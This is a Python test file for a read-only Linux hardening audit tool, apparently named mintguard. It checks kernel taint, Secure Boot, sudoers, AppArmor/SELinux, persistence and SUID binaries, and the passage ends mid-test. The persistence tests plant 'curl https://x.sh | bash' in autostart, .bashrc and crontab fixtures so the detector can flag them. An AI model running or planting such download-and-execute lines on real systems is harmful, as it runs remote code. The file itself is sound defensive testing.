"""Tests for the read-only hardening audit (kernel, hardware, rules).

Every check must be safe: an unreadable file is never an exception,
only an INFO "no verificable" finding.
"""

import os
import tempfile
import time
import unittest
from contextlib import ExitStack, contextmanager
from pathlib import Path
from unittest import mock

from mintguard.checks import hardening
from mintguard.checks.hardening import (
    check_core_dumps,
    check_cpu_mitigations,
    check_iommu,
    check_kernel_errors,
    check_kernel_taint,
    check_mac,
    check_mac_runtime,
    check_persistence,
    check_secure_boot,
    check_sudoers,
    check_suid_binaries,
    cmdline_apparmor_disabled,
    parse_apparmor_profiles,
    parse_attr_current,
    parse_core_limit,
    parse_desktop_exec,
    parse_kernel_errors,
    parse_selinux_enforce,
    parse_sudoers_aliases,
    parse_sudoers_rules,
    parse_suspicious_commands,
    parse_tainted,
    parse_vulnerability_status,
    parse_yes_no,
    scan_attr_profiles,
    scan_suid_binaries,
    separar_perfiles_disco,
    SuidBinary,
)
from mintguard.core.distro import DistroInfo, PackageManager
from mintguard.core.prioritizer import Severidad

DISTRO = DistroInfo(
    distro_id="linuxmint",
    name="Linux Mint",
    version="22",
    package_manager=PackageManager("apt", "/usr/bin/apt"),
    has_systemd=True,
    mac_module="AppArmor",
    firewall_tool="UFW",
)


def _write(directory: Path, name: str, content: str) -> Path:
    path = directory / name
    path.write_text(content, encoding="utf-8")
    return path


@contextmanager
def _entorno_mac(
    base: Path,
    *,
    modulo: bool = True,
    enabled: str | None = "Y\n",
    cmdline: str | None = "quiet\n",
    disco: dict[str, str] | Path | bool | None = None,
    perfiles: str | bool | None = None,
    perfiles_modo: int = 0o644,
    selinux_fs: bool = False,
    enforce: str | None = None,
    proc: dict[str, str] | bool | None = None,
):
    """Parchea todas las rutas del chequeo MAC a un entorno hermético.

    Convenciones: `None` = valor sano por defecto, `False` = inexistente,
    str/dict = contenido (los `proc` son pid -> attr/current). `disco` también
    acepta un Path (para simular un fichero donde debe haber un directorio).
    """
    if disco is None:
        disco = {"brave": ""}
    if perfiles is None:
        perfiles = "brave (enforce)\n"
    if proc is None:
        proc = False

    modulo_dir = base / "module"
    if modulo:
        modulo_dir.mkdir(exist_ok=True)

    enabled_path = base / "enabled"
    if enabled is not None:
        enabled_path.write_text(enabled, encoding="utf-8")
    cmdline_path = base / "cmdline"
    if cmdline is not None:
        cmdline_path.write_text(cmdline, encoding="utf-8")

    disk_dir = base / "disk"
    if isinstance(disco, dict):
        disk_dir.mkdir(exist_ok=True)
        for nombre, contenido in disco.items():
            (disk_dir / nombre).write_text(contenido, encoding="utf-8")
    elif disco is True:
        disk_dir.mkdir(exist_ok=True)

    profiles_path = base / "profiles"
    if perfiles is not False:
        profiles_path.write_text(perfiles, encoding="utf-8")
        os.chmod(profiles_path, perfiles_modo)

    selinux_dir = base / "selinux"
    enforce_path = selinux_dir / "enforce"
    if selinux_fs:
        selinux_dir.mkdir(exist_ok=True)
        if enforce is not None:
            enforce_path.write_text(enforce, encoding="utf-8")

    proc_dir = base / "proc"
    if isinstance(proc, dict):
        for pid, contenido in proc.items():
            (proc_dir / pid / "attr").mkdir(parents=True, exist_ok=True)
            (proc_dir / pid / "attr" / "current").write_text(contenido, encoding="utf-8")

    def _ruta(valor, nombre: str) -> Path:
        if valor is False:
            return base / f"no-{nombre}"
        if isinstance(valor, Path):
            return valor
        return base / nombre

    with ExitStack() as stack:
        stack.enter_context(
            mock.patch.object(hardening, "APPARMOR_MODULE_DIR", modulo_dir if modulo else base / "no-modulo")
        )
        stack.enter_context(mock.patch.object(hardening, "APPARMOR_ENABLED_PATH", enabled_path))
        stack.enter_context(mock.patch.object(hardening, "CMDLINE_PATH", cmdline_path))
        stack.enter_context(mock.patch.object(hardening, "APPARMOR_DISK_DIR", _ruta(disco, "disk")))
        stack.enter_context(
            mock.patch.object(
                hardening, "APPARMOR_PROFILES_PATH", _ruta(perfiles, "profiles")
            )
        )
        stack.enter_context(mock.patch.object(hardening, "SELINUX_FS_DIR", selinux_dir if selinux_fs else base / "no-selinux"))
        stack.enter_context(mock.patch.object(hardening, "SELINUX_ENFORCE_PATH", enforce_path))
        stack.enter_context(mock.patch.object(hardening, "PROC_DIR", _ruta(proc, "proc")))
        yield base


class KernelTaintTests(unittest.TestCase):
    """A) /proc/sys/kernel/tainted."""

    def test_parse_tainted_values(self):
        self.assertEqual(parse_tainted("0"), (0, []))
        self.assertEqual(parse_tainted("1")[0], 1)
        self.assertEqual(parse_tainted("4096")[0], 4096)
        self.assertEqual(parse_tainted("8193")[0], 8193)
        # A live patch (bit 12) and a proprietary module (bit 0).
        value, reasons = parse_tainted("4097")
        self.assertEqual(value, 4097)
        self.assertEqual(len(reasons), 2)
        self.assertEqual(parse_tainted("nope"), (-1, []))

    def test_clean_kernel_is_info(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = _write(Path(tmp), "tainted", "0\n")
            with mock.patch.object(hardening, "TAINTED_PATH", path):
                findings = check_kernel_taint()
        self.assertEqual(findings[0].severity, Severidad.INFO)

    def test_tainted_kernel_is_media(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = _write(Path(tmp), "tainted", "1\n")
            with mock.patch.object(hardening, "TAINTED_PATH", path):
                findings = check_kernel_taint()
        self.assertEqual(findings[0].severity, Severidad.MEDIA)
        self.assertIn("módulo propietario", findings[0].detail)

    def test_security_bit_is_alta(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = _write(Path(tmp), "tainted", "8193\n")
            with mock.patch.object(hardening, "TAINTED_PATH", path):
                findings = check_kernel_taint()
        self.assertEqual(findings[0].severity, Severidad.ALTA)

    def test_missing_file_is_info_not_crash(self):
        with mock.patch.object(hardening, "TAINTED_PATH", Path("/no/existe/tainted")):
            findings = check_kernel_taint()
        self.assertEqual(findings[0].severity, Severidad.INFO)
        self.assertIn("no verificable", findings[0].title)


class CoreDumpTests(unittest.TestCase):
    """B) /proc/sys/kernel/core_pattern y el límite de /proc/self/limits."""

    LIMITS = "Limit  Soft Limit  Hard Limit  Units\nCore file size  0  unlimited  bytes\n"

    def test_parse_core_limit(self):
        self.assertEqual(parse_core_limit(self.LIMITS), 0)
        unlimited = "Core file size  unlimited  unlimited  bytes\n"
        self.assertEqual(parse_core_limit(unlimited), -1)
        self.assertIsNone(parse_core_limit("sin limites\n"))

    def _check(self, pattern: str, limits: str):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            pattern_path = _write(base, "core_pattern", pattern)
            limits_path = _write(base, "limits", limits)
            with (
                mock.patch.object(hardening, "CORE_PATTERN_PATH", pattern_path),
                mock.patch.object(hardening, "LIMITS_PATH", limits_path),
            ):
                return check_core_dumps()

    def test_pipe_pattern_goes_to_a_handler(self):
        findings = self._check("|/usr/lib/systemd/systemd-coredump %P\n", self.LIMITS)
        self.assertEqual(findings[0].severity, Severidad.INFO)
        self.assertIn("gestor", findings[0].title)

    def test_file_pattern_with_limit_zero_is_info(self):
        findings = self._check("core\n", self.LIMITS)
        self.assertEqual(findings[0].severity, Severidad.INFO)

    def test_file_pattern_with_limit_is_alta(self):
        limits = "Core file size  1048576  unlimited  bytes\n"
        findings = self._check("core.%p\n", limits)
        self.assertEqual(findings[0].severity, Severidad.ALTA)
        self.assertIn("contraseñas", findings[0].detail)

    def test_unreadable_limits_is_info(self):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            pattern_path = _write(base, "core_pattern", "core\n")
            with (
                mock.patch.object(hardening, "CORE_PATTERN_PATH", pattern_path),
                mock.patch.object(hardening, "LIMITS_PATH", Path("/no/existe/limits")),
            ):
                findings = check_core_dumps()
        self.assertEqual(findings[0].severity, Severidad.INFO)


class CpuMitigationTests(unittest.TestCase):
    """C) /sys/devices/system/cpu/vulnerabilities."""

    def test_parse_status(self):
        self.assertEqual(parse_vulnerability_status("Not affected"), "not-affected")
        self.assertEqual(parse_vulnerability_status("Mitigation: Enhanced IBRS"), "mitigated")
        self.assertEqual(parse_vulnerability_status("Vulnerable: eBPF"), "vulnerable")
        self.assertEqual(parse_vulnerability_status(""), "unknown")

    def test_vulnerable_cpu_is_alta(self):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            _write(base, "spectre_v2", "Vulnerable: eBPF: enabled with unprivileged bpf()\n")
            _write(base, "meltdown", "Not affected\n")
            with mock.patch.object(hardening, "CPU_VULNERABILITIES_DIR", base):
                findings = check_cpu_mitigations()
        self.assertEqual(findings[0].severity, Severidad.ALTA)
        self.assertIn("spectre_v2", findings[0].evidence)

    def test_mitigated_cpu_is_one_info(self):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            _write(base, "spectre_v2", "Mitigation: Enhanced IBRS\n")
            _write(base, "meltdown", "Not affected\n")
            with mock.patch.object(hardening, "CPU_VULNERABILITIES_DIR", base):
                findings = check_cpu_mitigations()
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, Severidad.INFO)
        self.assertIn("1 mitigación(es) activas", findings[0].detail)

    def test_missing_directory_is_info(self):
        with mock.patch.object(hardening, "CPU_VULNERABILITIES_DIR", Path("/no/existe")):
            findings = check_cpu_mitigations()
        self.assertEqual(findings[0].severity, Severidad.INFO)


class IommuTests(unittest.TestCase):
    """D) /sys/class/iommu."""

    def test_missing_iommu_is_media(self):
        with mock.patch.object(hardening, "IOMMU_DIR", Path("/no/existe")):
            findings = check_iommu()
        self.assertEqual(findings[0].severity, Severidad.MEDIA)

    def test_empty_iommu_is_media(self):
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.object(hardening, "IOMMU_DIR", Path(tmp)):
                findings = check_iommu()
        self.assertEqual(findings[0].severity, Severidad.MEDIA)

    def test_active_iommu_is_info(self):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            (base / "IntelIOMMU").mkdir()
            with mock.patch.object(hardening, "IOMMU_DIR", base):
                findings = check_iommu()
        self.assertEqual(findings[0].severity, Severidad.INFO)


class SecureBootTests(unittest.TestCase):
    """E) /sys/firmware/efi/efivars/SecureBoot-*."""

    def _efi(self, tmp: str, value: bytes | None):
        base = Path(tmp) / "efi"
        efivars = base / "efivars"
        efivars.mkdir(parents=True)
        if value is not None:
            (efivars / "SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c").write_bytes(value)
        return base

    def test_legacy_boot_is_info(self):
        with mock.patch.object(hardening, "EFI_DIR", Path("/no/existe")):
            findings = check_secure_boot()
        self.assertEqual(findings[0].severity, Severidad.INFO)
        self.assertIn("legacy", findings[0].detail)

    def test_enabled_secure_boot_is_info(self):
        with tempfile.TemporaryDirectory() as tmp:
            efi = self._efi(tmp, b"\x01\x00\x00\x00" + b"\x01")
            with mock.patch.object(hardening, "EFI_DIR", efi):
                findings = check_secure_boot()
        self.assertEqual(findings[0].severity, Severidad.INFO)
        self.assertIn("activo", findings[0].title)

    def test_disabled_secure_boot_is_alta(self):
        with tempfile.TemporaryDirectory() as tmp:
            efi = self._efi(tmp, b"\x01\x00\x00\x00" + b"\x00")
            with mock.patch.object(hardening, "EFI_DIR", efi):
                findings = check_secure_boot()
        self.assertEqual(findings[0].severity, Severidad.ALTA)

    def test_missing_variable_is_info(self):
        with tempfile.TemporaryDirectory() as tmp:
            efi = self._efi(tmp, None)
            with mock.patch.object(hardening, "EFI_DIR", efi):
                findings = check_secure_boot()
        self.assertEqual(findings[0].severity, Severidad.INFO)


class SudoersTests(unittest.TestCase):
    """F) /etc/sudoers y /etc/sudoers.d/."""

    def test_parse_nopasswd_all(self):
        rules = parse_sudoers_rules(["user ALL=(ALL) NOPASSWD: ALL"])
        self.assertEqual(rules[0][0], "nopasswd_all")

    def test_nopasswd_specific_command_is_not_a_finding(self):
        self.assertEqual(parse_sudoers_rules(["user ALL=(ALL) NOPASSWD: /usr/bin/foo"]), [])

    def test_parse_env_keep(self):
        rules = parse_sudoers_rules(["Defaults env_keep += \"LD_PRELOAD\""])
        self.assertEqual(rules[0][0], "env_keep")

    def test_parse_wildcard_editor(self):
        rules = parse_sudoers_rules(["user ALL=(ALL) /usr/bin/vim *"])
        self.assertEqual(rules[0][0], "wildcard")

    def test_commented_lines_are_ignored(self):
        self.assertEqual(parse_sudoers_rules(["# user ALL=(ALL) NOPASSWD: ALL"]), [])

    def test_parse_aliases(self):
        aliases = parse_sudoers_aliases(["User_Alias ADMINS = alice,bob"])
        self.assertEqual(aliases, ["ADMINS"])

    def _check(self, files: dict[str, str]):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            sudoers = _write(base, "sudoers", files.get("sudoers", ""))
            dropins = base / "sudoers.d"
            dropins.mkdir()
            for name, content in files.items():
                if name != "sudoers":
                    _write(dropins, name, content)
            with (
                mock.patch.object(hardening, "SUDOERS_PATH", sudoers),
                mock.patch.object(hardening, "SUDOERS_DIR", dropins),
            ):
                return check_sudoers()

    def test_nopasswd_all_is_critica(self):
        findings = self._check({"sudoers": "user ALL=(ALL) NOPASSWD: ALL\n"})
        self.assertEqual(findings[0].severity, Severidad.CRITICA)

    def test_wildcard_is_media(self):
        findings = self._check({"sudoers": "user ALL=(ALL) /usr/bin/vim *\n"})
        self.assertEqual(findings[0].severity, Severidad.MEDIA)

    def test_clean_sudoers_is_info(self):
        findings = self._check({"sudoers": "user ALL=(ALL) /usr/bin/apt-get update\n"})
        self.assertEqual(findings[0].severity, Severidad.INFO)

    def test_alias_rule_is_not_evaluated(self):
        content = "User_Alias ADMINS = alice\nADMINS ALL=(ALL) NOPASSWD: ALL\n"
        findings = self._check({"sudoers": content})
        titles = [f.title for f in findings]
        self.assertTrue(any("alias" in t for t in titles))
        self.assertFalse(any("NOPASSWD" in t for t in titles))

    def test_unreadable_sudoers_is_info(self):
        with (
            mock.patch.object(hardening, "SUDOERS_PATH", Path("/no/existe/sudoers")),
            mock.patch.object(hardening, "SUDOERS_DIR", Path("/no/existe/sudoers.d")),
        ):
            findings = check_sudoers()
        self.assertEqual(findings[0].severity, Severidad.INFO)


class MacTests(unittest.TestCase):
    """G) AppArmor/SELinux: módulo, políticas, estado cargado y ejecución."""

    # -- parsers ---------------------------------------------------------

    def test_parse_profiles(self):
        text = (
            "usr.sbin.sshd (enforce)\n"
            "/usr/bin/foo (complain)\n"
            "/usr/bin/bar (complain)\n"
        )
        enforce, complain, names = parse_apparmor_profiles(text)
        self.assertEqual(enforce, 1)
        self.assertEqual(complain, 2)
        self.assertEqual(names, ["/usr/bin/foo", "/usr/bin/bar"])

    def test_parse_yes_no(self):
        self.assertTrue(parse_yes_no("Y\n"))
        self.assertFalse(parse_yes_no("N"))
        self.assertIsNone(parse_yes_no("quizás"))

    def test_cmdline_apparmor_disabled(self):
        self.assertTrue(cmdline_apparmor_disabled("BOOT_IMAGE=/vmlinuz quiet apparmor=0"))
        self.assertFalse(cmdline_apparmor_disabled("BOOT_IMAGE=/vmlinuz quiet"))

    def test_parse_selinux_enforce(self):
        self.assertEqual(parse_selinux_enforce("1\n"), 1)
        self.assertEqual(parse_selinux_enforce("0"), 0)
        self.assertIsNone(parse_selinux_enforce("modo raro"))

    def test_parse_attr_current(self):
        self.assertEqual(parse_attr_current(""), ("", None))
        self.assertEqual(parse_attr_current("unconfined\n"), ("", None))
        self.assertEqual(parse_attr_current("rsyslogd (enforce)"), ("rsyslogd", "enforce"))
        self.assertEqual(parse_attr_current("foo (complain)"), ("foo", "complain"))
        self.assertEqual(parse_attr_current("foo"), ("foo", None))

    def test_separar_perfiles_disco(self):
        perfiles, deshabilitados = separar_perfiles_disco(
            ["brave", "foo.disabled", "bar.dpkg-new", "baz~", "x.pacsave", "", "  sshd  "]
        )
        self.assertEqual(perfiles, ["brave", "sshd"])
        self.assertEqual(deshabilitados, ["foo.disabled"])

    # -- módulo ----------------------------------------------------------

    def test_module_disabled_is_media(self):
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(Path(tmp), enabled="N\n"):
                findings = check_mac()
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, Severidad.MEDIA)
        self.assertTrue(findings[0].signals)

    def test_cmdline_apparmor_zero_is_media(self):
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(Path(tmp), cmdline="quiet apparmor=0"):
                findings = check_mac()
        self.assertEqual(len(findings), 1)
        self.assertIn("apparmor=0", findings[0].detail)

    def test_no_mac_anywhere_is_info(self):
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(Path(tmp), modulo=False, perfiles=False, selinux_fs=False):
                findings = check_mac()
        self.assertEqual(findings[0].severity, Severidad.INFO)
        self.assertIn("Ni AppArmor ni SELinux", findings[0].title)

    # -- políticas en disco ----------------------------------------------

    def test_disk_profiles_are_info_with_evidence(self):
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(Path(tmp), disco={"brave": "", "sshd": ""}):
                findings = check_mac()
        hallazgo = next(f for f in findings if "definidos" in f.title)
        self.assertEqual(hallazgo.severity, Severidad.INFO)
        self.assertEqual(hallazgo.evidence, ["brave", "sshd"])

    def test_empty_disk_is_baja(self):
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(Path(tmp), disco={}):
                findings = check_mac()
        hallazgo = next(f for f in findings if "sin perfiles definidos" in f.title)
        self.assertEqual(hallazgo.severity, Severidad.BAJA)
        self.assertTrue(hallazgo.signals)

    def test_disabled_profiles_are_baja(self):
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(Path(tmp), disco={"brave": "", "old.disabled": ""}):
                findings = check_mac()
        hallazgo = next(f for f in findings if "deshabilitados" in f.title)
        self.assertEqual(hallazgo.severity, Severidad.BAJA)
        self.assertEqual(hallazgo.evidence, ["old.disabled"])

    def test_missing_disk_dir_is_no_verificable(self):
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(Path(tmp), disco=False):
                findings = check_mac()
        hallazgo = next(f for f in findings if "en disco" in f.title)
        self.assertEqual(hallazgo.severity, Severidad.INFO)
        self.assertIn("no verificable", hallazgo.title)

    def test_unreadable_disk_dir_is_no_verificable(self):
        # scandir sobre un fichero: NotADirectoryError (un OSError cualquiera).
        with tempfile.TemporaryDirectory() as tmp:
            archivo = _write(Path(tmp), "no-dir", "")
            with _entorno_mac(Path(tmp), disco=archivo):
                findings = check_mac()
        hallazgo = next(f for f in findings if "en disco" in f.title)
        self.assertIn("no verificable", hallazgo.title)

    # -- estado cargado --------------------------------------------------

    def test_complain_profiles_are_baja(self):
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(Path(tmp), perfiles="/usr/bin/foo (complain)\n"):
                findings = check_mac()
        hallazgo = next(f for f in findings if "complain" in f.title)
        self.assertEqual(hallazgo.severity, Severidad.BAJA)
        self.assertEqual(hallazgo.evidence, ["/usr/bin/foo"])

    def test_enforce_only_is_info(self):
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(Path(tmp), perfiles="usr.sbin.sshd (enforce)\n"):
                findings = check_mac()
        hallazgo = next(f for f in findings if "protegiendo" in f.title)
        self.assertEqual(hallazgo.severity, Severidad.INFO)

    def test_unreadable_loaded_is_no_verificable_with_context(self):
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(Path(tmp), perfiles_modo=0o000):
                findings = check_mac()
        hallazgo = next(f for f in findings if "Estado cargado" in f.title)
        self.assertEqual(hallazgo.severity, Severidad.INFO)
        self.assertIn("1 perfiles definidos en disco", hallazgo.detail)
        self.assertIn("aa-status", hallazgo.suggestion)

    def test_missing_securityfs_is_no_verificable(self):
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(Path(tmp), perfiles=False):
                findings = check_mac()
        hallazgo = next(f for f in findings if "Estado cargado" in f.title)
        self.assertIn("no está montado", hallazgo.detail)

    # -- SELinux ---------------------------------------------------------

    def test_selinux_enforcing_is_info(self):
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(Path(tmp), modulo=False, perfiles=False, selinux_fs=True, enforce="1\n"):
                findings = check_mac()
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, Severidad.INFO)
        self.assertIn("enforcing", findings[0].title)

    def test_selinux_permissive_is_baja(self):
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(Path(tmp), modulo=False, perfiles=False, selinux_fs=True, enforce="0"):
                findings = check_mac()
        self.assertEqual(findings[0].severity, Severidad.BAJA)
        self.assertTrue(findings[0].signals)

    def test_selinux_missing_enforce_is_no_verificable(self):
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(Path(tmp), modulo=False, perfiles=False, selinux_fs=True, enforce=None):
                findings = check_mac()
        self.assertIn("no verificable", findings[0].title)

    def test_selinux_garbage_is_no_verificable(self):
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(Path(tmp), modulo=False, perfiles=False, selinux_fs=True, enforce="???"):
                findings = check_mac()
        self.assertIn("formato no reconocido", findings[0].detail)

    # -- estado en ejecución --------------------------------------------

    def test_runtime_counts_confinados(self):
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(
                Path(tmp),
                proc={
                    "1": "unconfined",
                    "2": "rsyslogd (enforce)",
                    "3": "foo (complain)",
                    "4": "",
                },
            ):
                findings = check_mac_runtime()
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, Severidad.INFO)
        self.assertIn("2 proceso(s) confinado(s) en 2 perfil(es)", findings[0].title)
        self.assertIn("2 proceso(s) sin confinar", findings[0].detail)
        self.assertIn("1 en modo complain", findings[0].detail)
        # Desempate alfabético: informe reproducible sea como sea el orden de readdir.
        self.assertEqual(findings[0].evidence, ["foo: 1", "rsyslogd: 1"])

    def test_runtime_all_unconfined_is_info(self):
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(Path(tmp), proc={"1": "unconfined", "2": ""}):
                findings = check_mac_runtime()
        self.assertEqual(len(findings), 1)
        self.assertIn("Ningún proceso confinado", findings[0].title)

    def test_runtime_empty_or_missing_proc_returns_nothing(self):
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(Path(tmp), proc={}):
                self.assertEqual(check_mac_runtime(), [])
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(Path(tmp), proc=False):
                self.assertEqual(check_mac_runtime(), [])

    def test_runtime_unreadable_pid_counts_sin_leer(self):
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(Path(tmp), proc={"1": "unconfined"}) as base:
                # attr/current como directorio -> OSError al leer.
                (base / "proc" / "999" / "attr" / "current").mkdir(parents=True)
                findings = check_mac_runtime()
        self.assertIn("1 proceso(s) no se pudieron leer", findings[0].detail)

    def test_runtime_uses_selinux_contexts_phrase(self):
        with tempfile.TemporaryDirectory() as tmp:
            with _entorno_mac(
                Path(tmp),
                modulo=False,
                perfiles=False,
                selinux_fs=True,
                enforce="1\n",
                proc={"1": "unconfined_u:unconfined_r:unconfined_t:s0"},
            ):
                findings = check_mac_runtime()
        self.assertIn("contexto(s) de SELinux", findings[0].title)


class PersistenceTests(unittest.TestCase):
    """H) Autoarranque, rc.local, crontab y ficheros de inicio."""

    def test_parse_desktop_exec(self):
        entries = parse_desktop_exec(["[Desktop Entry]", "Exec=guake", "Name=Terminal"])
        self.assertEqual(entries, ["guake"])

    def test_parse_suspicious_commands(self):
        lines = ["# comment", "curl https://x.sh | bash", "export PATH=/usr/bin"]
        self.assertEqual(parse_suspicious_commands(lines), ["curl https://x.sh | bash"])

    def _home(self, base: Path, files: dict[str, str]):
        for name, content in files.items():
            path = base / name
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(content, encoding="utf-8")
        return base

    def _check(self, files: dict[str, str]):
        with tempfile.TemporaryDirectory() as tmp:
            home = self._home(Path(tmp), files)
            with (
                mock.patch.object(Path, "home", staticmethod(lambda: home)),
                mock.patch.object(hardening, "resolve_binary", return_value=None),
            ):
                return check_persistence(DISTRO)

    def test_normal_autostart_is_info(self):
        desktop = "[Desktop Entry]\nExec=guake\n"
        findings = self._check({".config/autostart/guake.desktop": desktop})
        self.assertEqual(findings[0].severity, Severidad.INFO)

    def test_autostart_with_download_and_execute_is_media(self):
        desktop = "[Desktop Entry]\nExec=sh -c 'curl https://x.sh | bash'\n"
        findings = self._check({".config/autostart/malo.desktop": desktop})
        self.assertEqual(findings[0].severity, Severidad.MEDIA)

    def test_autostart_outside_system_paths_is_alta(self):
        desktop = "[Desktop Entry]\nExec=/home/usuario/.local/bin/cosa\n"
        findings = self._check({".config/autostart/propio.desktop": desktop})
        self.assertEqual(findings[0].severity, Severidad.ALTA)

    def test_shell_startup_with_download_is_media(self):
        findings = self._check({".bashrc": "curl https://x.sh | bash\n"})
        self.assertEqual(findings[0].severity, Severidad.MEDIA)

    def test_empty_rc_local_is_not_a_finding(self):
        with tempfile.TemporaryDirectory() as tmp:
            rc_local = _write(Path(tmp), "rc.local", "# nada que hacer\n")
            with (
                mock.patch.object(hardening, "rc_local", rc_local, create=True),
                mock.patch.object(Path, "home", staticmethod(lambda: Path(tmp))),
                mock.patch.object(hardening, "resolve_binary", return_value=None),
            ):
                findings = check_persistence(DISTRO)
        self.assertEqual(findings[0].severity, Severidad.INFO)

    def _with_crontab(self, content: str):
        result = mock.Mock(returncode=0, stdout=content, stderr="")
        with tempfile.TemporaryDirectory() as tmp:
            with (
                mock.patch.object(Path, "home", staticmethod(lambda: Path(tmp))),
                mock.patch.object(hardening, "resolve_binary", return_value="/usr/bin/crontab"),
                mock.patch.object(hardening, "run_command", return_value=result),
            ):
                return check_persistence(DISTRO)

    def test_crontab_with_download_and_execute_is_media(self):
        findings = self._with_crontab("0 5 * * * curl https://x.sh | bash\n")
        self.assertEqual(findings[0].severity, Severidad.MEDIA)
        self.assertIn("crontab", findings[0].evidence[0])

    def test_crontab_outside_system_paths_is_alta(self):
        findings = self._with_crontab("0 5 * * * /home/usuario/.local/bin/cosa\n")
        self.assertEqual(findings[0].severity, Severidad.ALTA)

    def test_normal_crontab_is_info(self):
        findings = self._with_crontab("0 5 * * * /usr/bin/backup.sh\n")
        self.assertEqual(findings[0].severity, Severidad.INFO)


class KernelErrorTests(unittest.TestCase):
    """I) Errores del kernel (dmesg)."""

    def test_parse_kernel_errors(self):
        text = "Jan 1 00:00:00 kernel: BUG: unable to handle kernel\nJan 1 00:00:01 kernel: otra\n"
        errors = parse_kernel_errors(text)
        self.assertEqual(len(errors), 1)
        self.assertIn("BUG:", errors[0])

    def test_no_errors_is_info(self):
        with mock.patch.object(hardening, "run_command", return_value=None):
            with mock.patch.object(hardening, "_read_text", return_value=(None, "no existe")):
                findings = check_kernel_errors(DISTRO)
        self.assertEqual(findings[0].severity, Severidad.INFO)

    def test_errors_are_reported_with_the_distro_command(self):
        result = mock.Mock(returncode=0, stdout="kernel: Oops: 1: fatal error\n", stderr="")
        with mock.patch.object(hardening, "run_command", return_value=result):
            findings = check_kernel_errors(DISTRO)
        self.assertEqual(findings[0].severity, Severidad.INFO)
        self.assertIn("ubuntu-bug", findings[0].suggestion)


class SuidTests(unittest.TestCase):
    """J) Binarios SUID/SGID: ejecutarlos es ejecutarlos como root."""

    def _suid_file(self, base: Path, name: str, mode: int, uid: int | None = None):
        path = base / name
        path.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
        path.chmod(mode)
        if uid is not None:
            os.chown(path, uid, -1)
        return path

    def test_scan_finds_a_suid_file_in_a_temporary_folder(self):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            self._suid_file(base, "sudo", 0o4755)
            self._suid_file(base, "normal", 0o755)
            found = scan_suid_binaries((str(base),))
        self.assertEqual([binary.path for binary in found], [str(base / "sudo")])
        self.assertEqual(found[0].kind, "suid")

    def test_sgid_is_detected_too(self):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            self._suid_file(base, "sgid", 0o2755)
            found = scan_suid_binaries((str(base),))
        self.assertEqual(found[0].kind, "sgid")

    def test_symlink_to_the_same_binary_is_not_counted_twice(self):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            target = self._suid_file(base, "sudo", 0o4755)
            (base / "sudo2").symlink_to(target)
            found = scan_suid_binaries((str(base),))
        self.assertEqual(len(found), 1)

    def test_suid_behind_a_symlink_is_found(self):
        # Un setuid escondido detrás de un enlace (por ejemplo un enlace
        # en /usr/local/bin a un binario del usuario) es una escalada.
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            objetivo = self._suid_file(base, "herramienta", 0o4755)
            (base / "enlace").symlink_to(objetivo)
            found = scan_suid_binaries((str(base),))
        self.assertEqual(len(found), 1)
        # El nombre reportado es el del enlace o el del destino: lo que
        # importa es que se detecta (el mismo inodo no se cuenta dos veces).
        self.assertIn(found[0].path, {str(base / "enlace"), str(base / "herramienta")})

    def test_scan_is_deterministic(self):
        # El informe tiene que ser el mismo en cada ejecución: el orden
        # del sistema de ficheros no lo es.
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            for name in ("zeta", "alfa", "mike"):
                self._suid_file(base, name, 0o4755)
            primero = [b.path for b in scan_suid_binaries((str(base),))]
            segundo = [b.path for b in scan_suid_binaries((str(base),))]
        self.assertEqual(primero, segundo)
        self.assertEqual(primero, sorted(primero))

    def test_user_owned_suid_binary_is_alta(self):
        # The temporary file belongs to the test user, not to root: a setuid
        # that is not root's is a trivial escalation.
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            self._suid_file(base, "trampa", 0o4755)
            with mock.patch.object(hardening, "SYSTEM_BIN_DIRS", (str(base),)):
                findings = check_suid_binaries()
        self.assertEqual(findings[0].severity, Severidad.ALTA)
        self.assertIn("trampa", findings[0].evidence[0])

    def test_writable_suid_binary_is_alta(self):
        # Writable by others: anyone can replace it and get root.
        with tempfile.TemporaryDirectory() as tmp:
